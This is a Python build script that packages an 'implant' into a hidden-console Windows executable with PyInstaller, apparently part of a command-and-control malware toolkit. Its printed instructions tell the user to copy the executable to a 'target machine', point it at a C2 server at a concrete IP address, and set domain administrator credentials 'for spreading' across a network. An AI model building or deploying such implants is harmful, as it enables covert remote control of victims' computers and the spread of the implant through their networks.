import os
import sys
import subprocess
import shutil
from datetime import datetime

def check_dependencies():
    """Check and install required dependencies"""
    try:
        # Try to import PyInstaller
        import PyInstaller
    except ImportError:
        print("PyInstaller not found. Installing required dependencies...")
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], check=True)
            print("PyInstaller installed successfully.")
        except subprocess.CalledProcessError as e:
            print(f"Error installing PyInstaller: {e}")
            sys.exit(1)

def build_implant():
    """Build the implant executable using PyInstaller"""
    print("Building implant executable...")
    
    # Check dependencies first
    check_dependencies()
    
    # Create build directory if it doesn't exist
    if not os.path.exists('build'):
        os.makedirs('build')
    
    # Create dist directory if it doesn't exist
    if not os.path.exists('dist'):
        os.makedirs('dist')

    # Get the path to PyInstaller
    try:
        pyinstaller_path = subprocess.check_output([sys.executable, "-m", "PyInstaller", "--version"]).decode().strip()
        print(f"Using PyInstaller version: {pyinstaller_path}")
    except subprocess.CalledProcessError:
        print("Error: Could not find PyInstaller executable")
        sys.exit(1)

    # Get the absolute path to the implant.py file
    implant_path = os.path.abspath('implant/implant.py')
    implant_dir = os.path.dirname(implant_path)

    # PyInstaller command
    pyinstaller_cmd = [
        sys.executable,  # Use the current Python interpreter
        "-m",  # Run as module
        "PyInstaller",
        "--noconfirm",
        "--onefile",
        "--windowed",  # Hide console window
        "--clean",
        f"--add-data={implant_path};.",  # Use correct syntax for Windows
        "--name", f'implant_{datetime.now().strftime("%Y%m%d_%H%M%S")}',
        implant_path
    ]
    
    # Add icon if it exists
    icon_path = os.path.join('assets', 'icon.ico')
    if os.path.exists(icon_path):
        pyinstaller_cmd.extend(['--icon', icon_path])

    # Store the expected exe name for later use
    exe_name = f'implant_{datetime.now().strftime("%Y%m%d_%H%M%S")}.exe'
    dist_path = os.path.join('dist', exe_name)
    build_path = os.path.join('build', exe_name)

    try:
        print("Running PyInstaller...")
        print(f"Command: {' '.join(pyinstaller_cmd)}")  # Print the command for debugging
        # Run PyInstaller
        subprocess.run(pyinstaller_cmd, check=True)
        
        if os.path.exists(dist_path):
            # Move executable to build directory
            shutil.move(dist_path, build_path)
            print(f"\nImplant executable built successfully: {build_path}")
            print("\nTo use the implant:")
            print("1. Copy the executable to the target machine")
            print("2. Run it with the C2 server URL as an argument:")
            print(f"   {exe_name} http://178.79.133.66:5000")
            print("\nOptional: Set domain credentials for spreading:")
            print("   set DOMAIN_USER=domain\\admin")
            print("   set DOMAIN_PASSWORD=password")
        else:
            print(f"Error: Executable not found at {dist_path}")
            sys.exit(1)
            
    except subprocess.CalledProcessError as e:
        print(f"Error building implant: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"Unexpected error: {e}")
        print("Please ensure you have all required dependencies installed:")
        print("pip install -r requirements.txt")
        sys.exit(1)
    finally:
        # Cleanup
        try:
            if os.path.exists('dist'):
                shutil.rmtree('dist')
            if os.path.exists('implant.spec'):
                os.remove('implant.spec')
            if os.path.exists('build') and not os.path.exists(build_path):
                shutil.rmtree('build')
        except Exception as e:
            print(f"Warning: Error during cleanup: {e}")

if __name__ == '__main__':
    build_implant() 